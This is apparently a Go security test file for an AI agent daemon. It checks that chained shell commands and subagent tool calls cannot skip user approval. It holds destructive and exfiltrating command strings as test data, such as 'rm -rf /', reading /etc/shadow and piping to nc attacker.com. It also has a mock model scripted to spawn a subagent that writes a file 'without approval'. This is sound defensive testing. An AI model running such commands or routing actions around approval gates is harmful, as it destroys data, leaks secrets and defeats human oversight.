package agent_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/antigravity/remote-daemon/pkg/agent"
	"github.com/antigravity/remote-daemon/pkg/approval"
	"github.com/antigravity/remote-daemon/pkg/eventstore"
	"github.com/antigravity/remote-daemon/pkg/session"
	"github.com/antigravity/remote-daemon/pkg/tools"
	"github.com/antigravity/remote-daemon/pkg/workspace"
)

// TestBreak_ApprovalBypass_RunCommandChaining proves that shell metacharacters
// (&&, ;, |, >, $, backticks, &) must NEVER bypass approval when using run_command,
// even if prefixed by "echo ", "git status", or "pwd".
func TestBreak_ApprovalBypass_RunCommandChaining(t *testing.T) {
	wsMgr := workspace.NewManager()
	tmpDir := t.TempDir()
	_, _ = wsMgr.RegisterWorkspace("ws", "test", tmpDir)

	regGated := tools.NewRegistry(wsMgr, false)

	bypassAttempts := []string{
		"git status && rm -rf /",
		"echo hello > /tmp/evil",
		"pwd; cat /etc/shadow",
		"echo $(id)",
		"echo `whoami`",
		"git status | nc attacker.com 1337",
		"pwd & del /f /q C:\\",
		"echo malicious",
		"pwd\nrm -rf /",
	}

	for _, cmd := range bypassAttempts {
		payload, _ := json.Marshal(map[string]string{"command": cmd})
		if !regGated.NeedsApproval("run_command", payload) {
			t.Fatalf("SECURITY VULNERABILITY: run_command with command %q bypassed approval!", cmd)
		}
	}
}

type subagentBypassLLM struct {
	executedSubagentTool bool
}

func (m *subagentBypassLLM) Generate(ctx context.Context, messages []agent.LLMMessage, availableTools []tools.ToolDefinition, onChunk func(string)) (*agent.LLMResponse, error) {
	lastMsg := messages[len(messages)-1]

	// 1. Parent receives user prompt -> calls invoke_subagent
	if lastMsg.Role == "user" && lastMsg.Content == "Run destructive task" {
		callArgs, _ := json.Marshal(map[string]string{
			"role": "executor",
			"task": "Create malicious file",
		})
		return &agent.LLMResponse{
			Thought: "I will use a subagent to execute the task without approval.",
			Message: "Spawning subagent...",
			ToolCalls: []agent.ToolCall{
				{
					ID:        "call_subagent_bypass",
					Name:      "invoke_subagent",
					Arguments: callArgs,
				},
			},
		}, nil
	}

	// 2. Subagent receives mission -> attempts to call write_to_file (mutating tool)
	if lastMsg.Role == "user" && len(messages) == 1 {
		writeArgs, _ := json.Marshal(map[string]string{
			"path":    "pwned.txt",
			"content": "hacked by subagent without approval",
		})
		return &agent.LLMResponse{
			Thought: "I am writing the file directly.",
			ToolCalls: []agent.ToolCall{
				{
					ID:        "call_write_file",
					Name:      "write_to_file",
					Arguments: writeArgs,
				},
			},
		}, nil
	}

	// 3. Subagent finishes
	if lastMsg.Role == "tool" && lastMsg.ToolCallID == "call_write_file" {
		m.executedSubagentTool = true
		return &agent.LLMResponse{
			Message: "File write completed: " + lastMsg.Content,
			Done:    true,
		}, nil
	}

	// 4. Parent completes
	if lastMsg.Role == "tool" && lastMsg.ToolCallID == "call_subagent_bypass" {
		return &agent.LLMResponse{
			Message: "Subagent mission finished.",
			Done:    true,
		}, nil
	}

	return &agent.LLMResponse{Message: "Default response", Done: true}, nil
}

// TestBreak_ApprovalBypass_SubagentToolExecution proves that a subagent cannot execute
// tools that require approval without going through the approval manager when autoApprove=false.
func TestBreak_ApprovalBypass_SubagentToolExecution(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "subagent_bypass_test.db")
	store, err := eventstore.NewSQLiteEventStore(dbPath)
	if err != nil {
		t.Fatalf("failed to create sqlite eventstore: %v", err)
	}
	defer store.Close()

	sessSvc := session.NewService(store, nil)
	wsMgr := workspace.NewManager()
	ws, err := wsMgr.RegisterWorkspace("ws-test", "Test WS", tmpDir)
	if err != nil {
		t.Fatalf("failed to register workspace: %v", err)
	}

	// Gated mode: autoApprove = FALSE
	toolsReg := tools.NewRegistry(wsMgr, false)
	apprMgr := approval.NewManager(sessSvc, 1*time.Second) // short timeout
	llm := &subagentBypassLLM{}

	eng := agent.NewEngine(sessSvc, wsMgr, toolsReg, apprMgr, llm)

	ctx := context.Background()
	parentSess, err := sessSvc.CreateSession(ctx, "srv-1", ws.ID, "Parent Session")
	if err != nil {
		t.Fatalf("failed to create parent session: %v", err)
	}

	// Start parent turn
	err = eng.StartTurn(ctx, parentSess.ID, "Run destructive task")
	if err != nil {
		t.Fatalf("StartTurn failed: %v", err)
	}

	// Wait up to 3 seconds for turn to complete or pause
	deadline := time.Now().Add(3 * time.Second)
	pwnedPath := filepath.Join(tmpDir, "pwned.txt")
	for time.Now().Before(deadline) {
		if _, err := os.Stat(pwnedPath); err == nil {
			t.Fatalf("CRITICAL APPROVAL BYPASS: Subagent wrote file %q without any user approval in gated mode!", pwnedPath)
		}
		time.Sleep(100 * time.Millisecond)
	}

	// Ensure the file was NEVER written because approval was never granted
	if _, err := os.Stat(pwnedPath); err == nil {
		t.Fatalf("CRITICAL APPROVAL BYPASS: pwned.txt was written by subagent without approval!")
	}
}
